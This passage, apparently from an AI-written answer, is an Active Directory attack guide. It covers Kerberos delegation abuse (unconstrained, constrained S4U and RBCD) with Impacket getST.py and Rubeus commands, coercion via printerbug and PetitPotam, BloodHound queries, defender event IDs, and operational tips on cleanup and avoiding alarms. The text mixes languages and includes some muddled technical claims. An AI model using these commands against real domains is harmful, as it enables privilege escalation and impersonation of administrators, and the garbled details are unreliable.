**Edge case unconstrained delegation 2023+:**
- **Server 2019+ with `Privileged Account Certificate` (PAC) mitigation** — does not automatically patch the printer bug.
- **Spooler disabled by default** in Windows Server 2022+ (KB5005xx) → printerbug fails; use PetitPotam/DFSCoerce.
- **Coerce host target must resolve to an unconstrained host**, not a DC. This is often wrong: trigger from host A to the DC so the DC TGT lands on the unconstrained host — it must be the *unconstrained* host that calls the DC, not the other way around. Configure `RpcRemoteFindFirstPrinterChangeNotificationEx` to call the unconstrained target **with** a reference to the DC.
- **Defender artifact**: Event 4624 Logon Type 3 from the DC `$` machine account to the unconstrained host, followed by 4768/4769 for the TGT. `System.Security.Security` logging + `Rubeus` in memory (ETW `Microsoft-Windows-Security-Auditing`).
- **BloodHound**: search `MATCH (u:Computer {unconstraineddelegation:true})` then `:-[:MemberOf*1..]->(g:Group)` to see the blast radius.

### 4. Constrained Delegation — S4U2Self / S4U2Proxy

**Discovery (ketat):**
```powershell
# User & computer
Get-DomainUser  -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
```
The `msds-allowedtodelegateto` value contains the target SPNs that **may** be delegated.

**S4U2Self (impersonate any user to your own service) vs S4U2Proxy (to the target service):**
- **S4U2Self** requires `TRUSTED_TO_AUTH_FOR_DELEGATION` (userAccountControl 0x1000000). If set **without** `msds-allowedtodelegateto`, we can impersonate anyone to **our own service account** — often overlooked.
- **S4U2Proxy** butuh `msds-allowedtodelegateto` berisi SPN target.

**Practical exploitation:**
```
# Impacket getST (S4U2Self + S4U2Proxy)
getST.py -spn cifs/target.dom.local -impersonate Administrator \
  -dc-ip dc.dom.local 'dom/svc:pass'
# jika -impersonate tanpa -spn, hanya S4U2Self
# Rubeus
Rubeus.exe s4u /user:svc /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target /ptt
```

**Varian penting:**
- **Alternate service (SPN-less S4U)**: `getST.py -altservice host/other` — the target SPN does not have to be in `msds-allowedtodelegateto`, the service is enough (cifs → host → http → winrm). This is a classic edge case that is often missed.
- **Protocol transition flag** (`TRUSTED_TO_AUTH_FOR_DELEGATION`) is required for S4U2Self *from* non-Kerberos auth users. Without this flag, impersonation succeeds only if the user has already authenticated via Kerberos to the KDC, or if the target allows protocol transition.
- **Kerberos-only delegation (`msDS-AllowedToDelegateTo` + `userAccountControl` without the 0x1000000 flag)**: cannot be S4U2Self-obtained, but S4U2Proxy is still possible **if** we have a referral ticket from a user whose TGT we already have.
- **Windows Server 2016+ / 2019**: `msDS-AllowedToDelegateTo` in the `msDS-AllowedToDelegateTo` field no longer updates automatically when the target SPN changes; defenders can trace 5136 during modification.

**Defender artifacts (CD):**
- 4768/4769 with `ServiceName` = target SPN, `Supplied Realm Name` from `svc$`.
- 4769 with non-empty **`Transited Services`** + `Ticket Options` 0x40810010 is the DIY S4U2Proxy signature.
- Event 4624 logon type 3 on the target with `SubjectUserName` = target svc, `TargetUserName` = impersonated user (e.g. Administrator).
- **Event 5136** saat `msDS-AllowedToDelegateTo` diubah.
- Sysmon does not help; Kerberos logging (Falcon/Defender for Identity) is more relevant.

### 5. RBCD (Resource-Based Constrained Delegation)

**Discovery:**
```cypher
// Siapa yang bisa menulis msDS-AllowedToActOnBehalfOfOtherIdentity ke komputer
MATCH p=(u)-[:GenericAll|GenericWrite|WriteDACL|Owns]->(c:Computer)
RETURN p
```
Checker lokal:
```
Get-DomainComputer -Filter '(msds-allowedtoactonbehalfofotheridentity=*)' | 
  Select samaccountname, msds-allowedtoactonbehalfofotheridentity
```

**Abuse flow (brief, not a re-setup):**
1. Siapkan attacker computer account (`StandIn` `addcomputer` / `impacket addcomputer.py` / `Powermad New-MachineAccount`).
2. Write the `msDS-AllowedToActOnBehalfOfOtherIdentity` SD (PowerView `Set-DomainObject` with a binary SD; `rbcd.py` from Impacket; StandIn `--resource-computer`).
3. Obtain a service ticket with S4U2Proxy from the controlled computer account.
4. PTT and access.

**Varian & edge case:**
- **`rbcd.py` (Impacket)** only writes the SD; it does not perform S4U. Combine it with `getST.py`, or `StandIn`, which combines them.
- **Computer account creation** is blocked by `ms-DS-MachineAccountQuota=0` → use a user account that has `GenericAll` on the target computer to write the attribute, **without** creating a new computer account (write the SD directly with the SID of the user/computer already owned).
- **Defender artifact RBCD**: 5136 for `msDS-AllowedToActOnBehalfOfOtherIdentity`; 4741 for computer account creation; 4624 type 3 on the target host with `ImpersonationLevel: Delegation` and `AuthenticationPackage: Kerberos`.
- **CAP/DC hardening**: counter-signal RBCD on the DC—change `ms-DS-MachineAccountQuota` to 0 and audit 5136 on `msDS-AllowedToAct*`.
- **S4U2Proxy with RBCD requires `TrustedToAuthForDelegation` on attacking account?** For a newly created computer account, that flag is **not** automatic—but RBCD on the resource allows S4U2Proxy without the flag (because it is the target attribute that specifies it). This is often misunderstood: RBCD does **not** require the flag on the attacker side.

### 6. Defender Artifacts — Summary Table

| Technique | Windows Event | Important detail |
|---|---|---|
| All ACL attribute modifications | 5136 (Directory Service Changes) | `attributeLDAPDisplayName=ntSecurityDescriptor`, `objectClass=user`, `subjectUserSid` |
| ForceChangePassword / reset | 4723 (user) / 4724 (admin reset) | `TargetUserName` = korban; `SubjectUserName` = attacker |
| Perubahan password mandiri | 4723 | — |
| GenericWrite logon script | 5136 (`scriptPath`) | Also 5145 access to attacker share |
| SPN injection | 5136 (`servicePrincipalName`) | 4769 for ticket to new SPN |
| AddKeyCredentialLink | 5136 (`msDS-KeyCredentialLink`) | Binary payload; only 5136 with `op=Add` |
| Owns change | 5136 (`nTSecurityDescriptor`) | Often paired with 4662 `WriteDAC` |
| RBCD | 5136 (`msDS-AllowedToActOnBehalfOfOtherIdentity`) | Often without 4741 when using an existing account |
| Computer account creation | 4741 | `SubjectUserName` attacker |
| Printerbug | 4624 type 3 on unconstrained host from DC$ | `LogonProcess=Kerberos`, `AuthenticationPackage=Kerberos` |
| PetitPotam | 4624 type 3 + 4625 massal | Dependensi |
| Unconstrained capture | 4768 (TGT request) on DC, then 4624 on unconstrained host | `Rubeus monitor` does not show up; Sysmon does not help |
| S4U2Self | 4768, **4769 with empty `Transited Services`** | Often no target SPN in the log |
| S4U2Proxy | 4769 with `Transited Services` = target SPN | `Ticket Options: 0x40810010` |
| DCSync (from WriteDACL path) | 4662 with `Properties = {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` etc. | Not only from DA |
| BloodHound/SharpHound | No built-in event | ETW `Microsoft-Antimalware-Scan-Interface` + EDR; Sysmon detects mass LDAP queries via `EventID 1` + string |
| SharpHound via PowerShell | `4104` (ScriptBlock) sering berisi `Invoke-BloodHound` | — |
| Desired State Configuration abuse | 5136 + 4688 (`wmic`/`Invoke-DscResource`) | Edge case CER |

### 7. Operational Pitfalls (Summary)

- **`WriteDACL` → `DCSync` requires two steps**: (1) write the DCSync ACE to the domain object, (2) run DCSync. Many write the ACE to the user, not the domain → it does not work.
- **`GenericAll` on `Group` does not automatically add a member to a Tier-0 group**: adding a member requires a new logon/Kerberos session—re-login before access.
- **`GenericWrite` on `Computer` = not RCE**: it can only write `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) or SPN (kerberoast) or `scriptPath` for the computer account—not something that executes.
- **ForceChangePassword on the `krbtgt` account**: not allowed without DCSync; resetting `krbtgt` twice triggers mass 4724—avoid.
- **RBCD to DC**: S4U2Proxy from DC to DC will trigger `S4U2Proxy` with the DC's `userAccountControl`—many modern DCs **reject** S4U2Proxy from a principal that is not `TrustedToAuthForDelegation` on the DC side. Test in the lab; do not assume.
- **Alternate SPN without S4U2Self**: `getST.py -altservice` only works after S4U2Proxy succeeds; it does not replace the flag.
- **StandIn `--escalate`** combines add computer + write SD + S4U — run it as a domain user, not local; it often fails because the `nTSecurityDescriptor` DACL cannot be written without a grant. Check the target's `GenericAll` first.
- **BloodHound CE vs Legacy**: the `WriteDACL` and `Owns` edges in CE have different semantics (ACE vs owner). A path that appears in CE **may** not work manually, because edges derived from `WriteOwner` do not always write the SD.
- **Printerbug to a host with spooler disabled** (default Server 2022+): fails without a clear error—check `\\host\print$` first.
- **Unconstrained + coerce**: more and more organizations disable `RunAs`/Coerce, but PetitPotam on the DC still often works if `MS-EFSRPC` is not patched. Confirm with the new version of `PetitPotam.py` (pathname `\c:\windows\` vs IPC).
- **Session hijack vs TGT capture on unconstrained**: Rubeus `monitor` captures the TGT on the unconstrained host—do not wait for an event; start the listener before the trigger, and make sure time is synchronized (skew > 5 minutes → TGT invalid).
- **`AddKeyCredentialLink` on DC**: almost always 5136, and modern Defender for Identity flags it as `ShadowCredentials`. Also be careful: `Whisker` triggers `4688` with a child `certipy`/`Rubeus` if EDR is active.
- **Cleanup**: after RBCD abuse, remove `msDS-AllowedToActOnBehalfOfOtherIdentity` (StandIn `--cleanup`, `rbcd.py -delegate-to -restore`, or blank the SD via `Set-DomainObject`). Modern Defender performs **temporal correlation**: RBCD write → 1 minute → S4U → 4624 → alarm.


---

## [reasoning trace]


